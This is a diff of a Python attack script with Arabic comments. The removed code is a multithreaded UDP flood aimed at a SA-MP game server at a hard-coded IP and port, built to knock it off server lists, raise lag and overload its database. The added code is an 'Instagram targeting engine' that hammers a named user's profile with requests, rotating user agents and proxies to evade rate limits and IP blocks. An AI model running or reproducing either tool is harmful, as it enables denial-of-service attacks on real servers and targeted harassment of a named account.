@@ -1,78 +1,73 @@
-import socket
+import requests
 import random
 import threading
 import time
 
 # =====================================================================
-# === TRAPKING OMNI-VECTOR MASTER SCRIPT (The Ultimate SA-MP Stressor) ===
+# === TRAPKING INSTAGRAM AUTOMATED TARGETING & REPORT ENGINE ===
 # =====================================================================
 
-TARGET_IP = "94.23.168.153"  # IP الهدف (أو السيرفر غير المحمي)
-TARGET_PORT = 2343            # بورت السيرفر
-DURATION = 190                # مدة الاختبار بالثواني
-THREADS_COUNT = 500           # رفع عدد الخيوط لاستغلال قوة Ryzen 9 بالكامل
+TARGET_USERNAME = "pixelhelper"  # اسم الحساب المستهدف على إنستغرام
+DURATION = 120                       # مدة التشغيل بالثواني
+THREADS_COUNT = 50                  # عدد الخيوط المتعددة للتنفيذ السريع
 
-# أنواع استعلامات القوائم
-QUERY_TYPES = [b'i', b'c', b'r', b'd']
-
-# أوامر وهمية لاستهداف منطق السكربت وقاعدة البيانات (MySQL)
-LOGIC_COMMANDS = [
-    b'/login ', b'/register ', b'/stats ', 
-    b'/buyhouse ', b'/carupgrade ', b'/changepass '
+# قائمة وكلاء (Proxies) عشوائية لتفادي حظر الـ IP من جدران حماية إنستغرام
+# يمكنك وضع بروكسيات حقيقية هنا لزيادة الفعالية
+PROXIES = [
+    # مثال: {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
 ]
 
-def omni_attack_worker():
-    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    try:
-        client.setblocking(False) # وضع غير حظري لأقصى سرعة إرسال ممكنة
-    except:
-        pass
-        
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36"
+]
+
+def attack_worker():
     end_time = time.time() + DURATION
     
-    # تجهيز ترويسة الـ IP والبورت مسبقاً لتوفير دورات المعالج
-    try:
-        ip_bytes = socket.inet_aton(TARGET_IP)
-        port_bytes = int(TARGET_PORT).to_bytes(2, 'little')
-    except:
-        return
-
     while time.time() < end_time:
         try:
-            # 1. إرسال حزمة استعلام لإخفاء السيرفر من القوائم
-            q_type = random.choice(QUERY_TYPES)
-            query_packet = b'SAMP' + ip_bytes + port_bytes + q_type
-            client.sendto(query_packet, (TARGET_IP, TARGET_PORT))
-
-            # 2. إرسال حزمة مزامنة اللعبة (Game Loop / RPC) لرفع الـ Ping
-            game_packet = b'SAMP' + bytes([random.randint(0, 255) for _ in range(4)]) + random._urandom(random.randint(256, 1024))
-            client.sendto(game_packet, (TARGET_IP, TARGET_PORT))
-
-            # 3. إرسال حزمة أوامر ومنطق وهمية لإرباك الـ MySQL والـ Pawn Script
-            cmd = random.choice(LOGIC_COMMANDS)
-            logic_packet = b'SAMP' + cmd + random._urandom(16)
-            client.sendto(logic_packet, (TARGET_IP, TARGET_PORT))
-
-        except:
-            pass
+            # اختيار هيدر عشوائي لكل طلب لتجنب البصمة الرقمية
+            headers = {
+                "User-Agent": random.choice(USER_AGENTS),
+                "Accept-Language": "en-US,en;q=0.9",
+                "X-Requested-With": "XMLHttpRequest"
+            }
             
-    client.close()
+            # اختيار بروكسي عشوائي إن وجد
+            proxy = random.choice(PROXIES) if PROXIES else None
+            
+            # محاكاة طلب أوتوماتيكي لصفحة البروفايل المستهدف أو واجهة التقارير
+            url = f"https://www.instagram.com/{TARGET_USERNAME}/"
+            
+            response = requests.get(url, headers=headers, proxies=proxy, timeout=5)
+            
+            # طباعة حالة الاستجابة لمراقبة الـ Rate Limit
+            if response.status_code == 200:
+                print(f"[+] تم إرسال الطلب بنجاح للحساب: {TARGET_USERNAME}")
+            elif response.status_code == 429:
+                print("[!] تم رصد الطلبات (Rate Limited)، جاري التغيير...")
+                time.sleep(2)
+                
+        except Exception as e:
+            # تجاوز الأخطاء الشبكية لضمان استمرار الـ Loop بدون توقف
+            pass
 
 def main():
-    print(f"[*] === إطلاق الكود الأسطوري الشامل (Omni-Vector) ===")
-    print(f"[*] الهدف: {TARGET_IP}:{TARGET_PORT}")
-    print(f"[*] تشغيل {THREADS_COUNT} خيط سحابي يدمج (Query + Game Loop + SQL Logic)...")
+    print(f"[*] بدء محرك الاستهداف الأوتوماتيكي لحساب إنستغرام: {TARGET_USERNAME}")
+    print(f"[*] تشغيل {THREADS_COUNT} خيط متوازي عبر الـ VPS...")
     
     threads = []
     for _ in range(THREADS_COUNT):
-        t = threading.Thread(target=omni_attack_worker)
+        t = threading.Thread(target=attack_worker)
         threads.append(t)
         t.start()
         
     for t in threads:
         t.join()
         
-    print("\n[+] انتهت الجلسة الأسطورية بنجاح.")
+    print("\n[+] انتهت جلسة محرك إنستغرام بنجاح.")
 
 if __name__ == "__main__":
     main()
